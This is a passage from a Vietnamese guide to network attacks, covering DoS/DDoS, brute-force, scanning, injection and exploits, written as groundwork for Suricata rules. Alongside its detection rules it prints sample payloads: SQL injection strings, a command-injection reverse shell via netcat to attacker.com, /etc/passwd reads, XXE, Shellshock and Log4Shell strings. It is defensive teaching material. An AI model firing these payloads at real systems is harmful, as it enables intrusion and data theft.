  Attacker → Open DNS: Query ANY example.com
                        (Spoofed source = Target IP)
  Open DNS → Target: Response 3000 bytes

  Amplification: 64 bytes → 3000 bytes (~50x)
  ```

- **NTP Amplification:**
  ```
  Attacker → NTP Server: monlist command (234 bytes)
                         (Spoofed source = Target)
  NTP Server → Target: Response (48KB)

  Amplification: ~200x
  ```

**2. Protocol Attacks (Layer 4):**
Làm quá tải bảng kết nối, state table.

- **SYN Flood:**
  ```
  Attacker → Target: SYN (spoofed source IP)
  Target → Spoofed IP: SYN-ACK
  (No ACK received)
  Target: Giữ half-open connection trong bảng

  Lặp lại hàng triệu lần → Bảng kết nối đầy
  ```

- **ACK Flood:**
  ```
  Attacker → Target: ACK packets (không thuộc connection nào)
  Target: Phải xử lý từng packet để check state table
  ```

- **Fragmentation Attack:**
  ```
  Attacker → Target: IP fragments (không hoàn chỉnh)
  Target: Giữ fragments trong bộ nhớ chờ reassemble
  → Timeout → Lặp lại → Hết bộ nhớ
  ```

**3. Application Layer Attacks (Layer 7):**
Làm quá tải ứng dụng.

- **HTTP Flood:**
  ```
  Attacker (botnet) → Web Server: HTTP GET / (hàng triệu requests)
  Web Server: CPU, database quá tải
  ```

- **Slowloris:**
  ```
  Attacker → Server: HTTP GET / HTTP/1.1\r\n
                     Host: example.com\r\n
                     (Không gửi \r\n\r\n để kết thúc header)
                     (Gửi từng byte một để keep-alive)

  Server: Giữ connection mở chờ header hoàn chỉnh
  Lặp lại nhiều lần → Hết connection pool
  ```

- **Slow Read Attack:**
  ```
  Attacker → Server: HTTP GET /largefile.zip
  Server → Attacker: Gửi data
  Attacker: Đọc chậm (TCP Window = 0 hoặc rất nhỏ)

  Server: Giữ connection mở lâu → Hết resources
  ```

**DDoS vs DoS:**
- **DoS:** Từ 1 nguồn tấn công
- **DDoS:** Từ nhiều nguồn (botnet) → khó block hơn

**Suricata phát hiện DoS/DDoS:**
- Threshold: Đếm số packets/flows trong khoảng thời gian
  ```
  alert tcp any any -> $HOME_NET 80 (
    msg:"Possible SYN Flood";
    flags:S;
    threshold: type threshold, track by_dst, count 100, seconds 10;
  )
  ```
- Detect SYN flood (nhiều SYN không có ACK)
- Detect UDP flood (traffic rate cao bất thường)
- Detect amplification attacks (DNS, NTP response lớn)
- Detect Slowloris (nhiều incomplete HTTP requests)

---

#### **1.5.2. Brute-force**

**Mục tiêu:** Thử nhiều password/key để tìm đúng credential.

**Các loại:**

**1. Online Brute-force:**
Thử trực tiếp trên service.

```
Attempt 1: admin:password123  → Failed
Attempt 2: admin:admin        → Failed
Attempt 3: admin:12345        → Failed
...
Attempt 523: admin:P@ssw0rd!  → Success!
```

**Services thường bị tấn công:**
- SSH (port 22)
- RDP (port 3389)
- FTP (port 21)
- HTTP login forms
- SMTP authentication
- MySQL/PostgreSQL

**2. Dictionary Attack:**
Dùng wordlist phổ biến.

```
Wordlist: rockyou.txt (14 triệu passwords)
- password
- 123456
- qwerty
- letmein
...
```

**3. Credential Stuffing:**
Dùng username:password bị leak từ data breach khác.

```
Leak từ Site A:
user@email.com:Password123

Thử trên Site B:
user@email.com:Password123 → Success!
(Nhiều người dùng lại password)
```

**Đặc điểm nhận dạng:**
- Nhiều failed login từ cùng IP
- Nhiều failed login đến cùng username
- Login attempts với patterns (user1, user2, user3...)
- High rate of authentication requests

**Suricata phát hiện Brute-force:**

```
alert tcp any any -> $HOME_NET 22 (
  msg:"SSH Brute Force Attempt";
  flow:to_server,established;
  content:"SSH-";
  threshold: type threshold, track by_src, count 5, seconds 60;
  classtype:attempted-admin;
)
```

```
alert tcp any any -> $HOME_NET 80 (
  msg:"HTTP Login Brute Force";
  flow:to_server,established;
  content:"POST"; http_method;
  content:"/login"; http_uri;
  threshold: type threshold, track by_src, count 10, seconds 60;
)
```

**Phòng chống:**
- Rate limiting
- Account lockout sau N lần failed
- CAPTCHA
- Two-factor authentication (2FA)
- Fail2ban (tự động block IP)

---

#### **1.5.3. Scan (Network Scanning)**

**Mục tiêu:** Thu thập thông tin về target (ports, services, OS, vulnerabilities).

**Các loại scan:**

**1. Port Scanning:**

**TCP Connect Scan (Full Open):**
```
Scanner → Target:80 : SYN
Target → Scanner    : SYN-ACK  (port open)
Scanner → Target    : ACK
Scanner → Target    : RST (close connection)
```

**SYN Scan (Half-open / Stealth):**
```
Scanner → Target:80 : SYN
Target → Scanner    : SYN-ACK  (port open)
Scanner → Target    : RST (không complete handshake)

Hoặc:
Target → Scanner    : RST  (port closed)
```
Ưu điểm: Không tạo full connection → ít log hơn

**NULL/FIN/XMAS Scan (Firewall evasion):**
```
NULL: Không có flags nào được set
FIN:  Chỉ có FIN flag
XMAS: FIN + PSH + URG flags

→ Open port: Không reply (theo RFC 793)
→ Closed port: Reply RST
```

**UDP Scan:**
```
Scanner → Target:53 : UDP packet
Target → Scanner    : ICMP Port Unreachable (closed)
                      (Không reply = open hoặc filtered)
```

**2. Service/Version Detection:**
```
Scanner → Target:80: GET / HTTP/1.0\r\n\r\n
Target → Scanner:    HTTP/1.1 200 OK
                     Server: Apache/2.4.41 (Ubuntu)
                     ...
```

**3. OS Fingerprinting:**
Xác định hệ điều hành dựa trên:
- TTL values (Windows: 128, Linux: 64, Cisco: 255)
- TCP Window size
- IP ID sequence
- TCP options
- ICMP responses

**Ví dụ:**
```
SYN → Target
SYN-ACK ← Target: TTL=64, Win=29200, MSS=1460
→ Có thể là Linux
```

**4. Vulnerability Scanning:**
Sử dụng tools như Nessus, OpenVAS, Nikto để tìm:
- Outdated software versions
- Default credentials
- Known CVEs
- Misconfigurations

**Scan patterns:**
- **Horizontal scan:** Scan cùng 1 port trên nhiều IPs
  ```
  10.0.0.1:80
  10.0.0.2:80
  10.0.0.3:80
  ... (Worm propagation pattern)
  ```

- **Vertical scan:** Scan nhiều ports trên 1 IP
  ```
  10.0.0.1:21
  10.0.0.1:22
  10.0.0.1:23
  10.0.0.1:80
  ... (Recon specific target)
  ```

**Suricata phát hiện Scan:**

```
# Phát hiện port scan (nhiều ports khác nhau)
alert tcp any any -> $HOME_NET any (
  msg:"Possible Port Scan";
  flags:S;
  threshold: type threshold, track by_src, count 20, seconds 60;
  classtype:attempted-recon;
)

# Phát hiện NULL scan
alert tcp any any -> $HOME_NET any (
  msg:"NULL Scan Detected";
  flags:0;
  classtype:attempted-recon;
)

# Phát hiện XMAS scan
alert tcp any any -> $HOME_NET any (
  msg:"XMAS Scan Detected";
  flags:FPU;
  classtype:attempted-recon;
)
```

**Suricata stream event flags:**
- Detect unusual TCP flags combinations
- Track scan patterns với threshold
- Correlation nhiều events để detect scan campaigns

---

#### **1.5.4. Injection Attacks**

**Mục tiêu:** Inject malicious code/commands vào ứng dụng.

**1. SQL Injection:**

**Vulnerable code:**
```php
$username = $_GET['user'];
$query = "SELECT * FROM users WHERE username = '$username'";
```

**Normal request:**
```
GET /profile?user=john
Query: SELECT * FROM users WHERE username = 'john'
```

**SQL Injection:**
```
GET /profile?user=john' OR '1'='1
Query: SELECT * FROM users WHERE username = 'john' OR '1'='1'
→ '1'='1' luôn đúng → Bypass authentication
```

**Advanced SQL Injection:**
```sql
-- Union-based
' UNION SELECT username,password FROM admin_users--

-- Time-based blind
' AND IF(1=1, SLEEP(5), 0)--

-- Boolean-based blind
' AND (SELECT COUNT(*) FROM users) > 10--

-- Stacked queries
'; DROP TABLE users;--
```

**Suricata detect SQL Injection:**
```
alert http any any -> any any (
  msg:"SQL Injection - UNION";
  flow:established,to_server;
  content:"union"; nocase; http_uri;
  content:"select"; nocase; http_uri;
  classtype:web-application-attack;
)
```

---

**2. Command Injection (OS Command Injection):**

**Vulnerable code:**
```php
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
```

**Command Injection:**
```
GET /ping?ip=8.8.8.8; cat /etc/passwd
Executed: ping -c 4 8.8.8.8; cat /etc/passwd

GET /ping?ip=8.8.8.8 | nc attacker.com 4444 -e /bin/bash
→ Reverse shell
```

**Injection characters:**
- `;` - Command separator
- `|` - Pipe
- `||` - OR operator
- `&` - Background
- `&&` - AND operator
- `$()` - Command substitution
- `` `cmd` `` - Command substitution
- `\n` - Newline

---

**3. LDAP Injection:**

```
// Vulnerable query
(&(uid=$username)(password=$password))

// Injection
username: admin)(&)
password: anything

// Result query
(&(uid=admin)(&)(password=anything))
→ (&(uid=admin) → True
```

---

**4. XPath Injection:**

```xml
<!-- Vulnerable query -->
//users/user[username='$user' and password='$pass']

<!-- Injection -->
username: ' or '1'='1
password: ' or '1'='1

<!-- Result -->
//users/user[username='' or '1'='1' and password='' or '1'='1']
```

---

**5. XML Injection / XXE (XML External Entity):**

**Vulnerable XML parser:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
```
→ XML parser đọc `/etc/passwd` và trả về trong response

**XXE với SSRF:**
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/admin">
]>
```
→ Exploit internal services

---

**6. LDAP Injection:**

```
// Normal query
(uid=john)(objectClass=person)

// Injection input: *)(uid=*))(|(uid=*
// Result query
(uid=*)(uid=*))(|(uid=*)(objectClass=person)
→ Returns all users
```

---

**Suricata detect Injection:**

```
# Command Injection
alert http any any -> any any (
  msg:"Command Injection Attempt";
  flow:established,to_server;
  content:"|3b|"; http_uri;  # semicolon
  content:"cat"; nocase; http_uri;
  classtype:web-application-attack;
)

# LDAP Injection
alert http any any -> any any (
  msg:"LDAP Injection";
  content:"(&"; http_uri;
  content:")("; http_uri;
  classtype:web-application-attack;
)

# XXE Injection
alert http any any -> any any (
  msg:"XXE Injection Attempt";
  content:"<!ENTITY"; http_client_body;
  content:"SYSTEM"; http_client_body;
  classtype:web-application-attack;
)
```

---

#### **1.5.5. Exploit**

**Mục tiêu:** Khai thác vulnerability để chiếm quyền điều khiển, thực thi code, hoặc gây crash.

**Phân loại:**

**1. Buffer Overflow:**

**Stack-based buffer overflow:**
```c
// Vulnerable code
void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // Không check độ dài
}
```

**Exploit:**
```
Input: "A" * 64 + "B" * 4 + shellcode_address
→ Overwrite return address
→ Jump to shellcode
→ Execute arbitrary code
```

**Heap-based buffer overflow:**
Overflow buffer trên heap để overwrite:
- Function pointers
- Object metadata
- Malloc/free structures

---

**2. Remote Code Execution (RCE):**

**Ví dụ: Shellshock (CVE-2014-6271):**
```bash
User-Agent: () { :; }; /bin/bash -c "cat /etc/passwd"
```
Bash vulnerable version thực thi code sau `() { :; };`

**Ví dụ: Log4Shell (CVE-2021-44228):**
```
${jndi:ldap://attacker.com/exploit}
```
Log4j thực thi JNDI lookup → RCE

---

**3. Privilege Escalation:**

**Vertical:** User → Root
```bash
# CVE-2021-4034: PwnKit
# Exploit polkit để escalate lên root
./exploit
# uid=1000(user) → uid=0(root)
```

**Horizontal:** User A → User B
```bash
# Access tokens theft, session hijacking
```

---

**4. Denial of Service Exploits:**

**Example: Ping of Death:**
```
Gửi ICMP packet lớn hơn 65,535 bytes (qua fragmentation)
→ Buffer overflow khi reassemble
→ System crash
```

**Example: Teardrop:**
```
Fragment 1: Offset=0, Len=100
Fragment 2: Offset=50, Len=100 (overlap)
→ Integer underflow khi reassemble
→ System crash
```

---

**5. Zero-day Exploits:**
Exploits cho vulnerabilities chưa được patch.

**Example: EternalBlue (MS17-010):**
```
SMBv1 vulnerability
→ Buffer overflow trong srv.sys driver
→ Remote code execution
→ Được sử dụng bởi WannaCry, NotPetya
```

---

**Exploit delivery methods:**

**1. Phishing email:**
```
Subject: Invoice #12345
Attachment: invoice.pdf.exe
```

**2. Drive-by download:**
```html
<script>
  window.location = "http://exploit-kit.com/rig?target=" +
                    navigator.userAgent;
</script>
```

**3. Watering hole:**
Compromise website mà target thường truy cập.

**4. Supply chain attack:**
Inject malicious code vào software updates hoặc dependencies.

---

**Exploit frameworks:**
- **Metasploit:** Framework phổ biến nhất
- **Exploit DB:** Database các exploits công khai
- **Canvas, Core Impact:** Commercial frameworks

---

**Suricata detect Exploits:**

```
# Shellshock
alert http any any -> any any (
  msg:"Shellshock Exploit Attempt";
  flow:established,to_server;
  content:"() {"; http_header;
  content:"/bin/"; http_header;
  classtype:web-application-attack;
)

# EternalBlue
alert smb any any -> any any (
  msg:"EternalBlue Exploit Attempt";
  flow:to_server,established;
  content:|ff|SMB|2b|;
  content:"|00 00 00 10 00 00 00 00|";
  classtype:attempted-admin;
)

# Generic RCE via User-Agent
alert http any any -> any any (
  msg:"Suspicious User-Agent RCE";
  flow:established,to_server;
  content:"|24 28|"; http_user_agent;  # $(
  pcre:"/User-Agent\x3a[^\r\n]*(\$\(|\`)/i";
  classtype:web-application-attack;
)

# Buffer overflow pattern (NOP sled)
alert tcp any any -> any any (
  msg:"Possible Buffer Overflow - NOP Sled";
  content:"|90 90 90 90 90 90 90 90|";
  threshold: type limit, track by_src, count 1, seconds 60;
  classtype:shellcode-detect;
)
```

**Exploit detection strategies:**
- **Signature-based:** Detect known exploit patterns
- **Anomaly-based:** Detect unusual behaviors (large packets, weird flags)
- **Protocol analysis:** Detect protocol violations
- **Shellcode detection:** Detect NOP sleds, common shellcode patterns

---

## 🎯 Mục tiêu đạt được

Sau khi nắm vững phần kiến thức nền tảng này, bạn đã hiểu:

✅ **Cách dữ liệu di chuyển qua mạng:** Từ Ethernet frame → IP packet → TCP/UDP segment → Application data

✅ **Cấu trúc các giao thức:** Biết các trường quan trọng trong headers để Suricata phân tích

✅ **Flow và Session:** Hiểu cách Suricata theo dõi kết nối và luồng dữ liệu

✅ **Reassembly và Fragmentation:** Biết cách IP/TCP reassemble và các kỹ thuật evasion

✅ **Các giao thức ứng dụng:** HTTP, DNS, TLS, SMTP, SSH, FTP, DHCP - cách hoạt động và anomalies

✅ **Các dạng tấn công mạng:** DoS/DDoS, brute-force, scan, injection, exploit - đặc điểm và cách phát hiện

→ **Đây là nền tảng để hiểu cách Suricata hoạt động, viết rules, và phân tích alerts hiệu quả.**
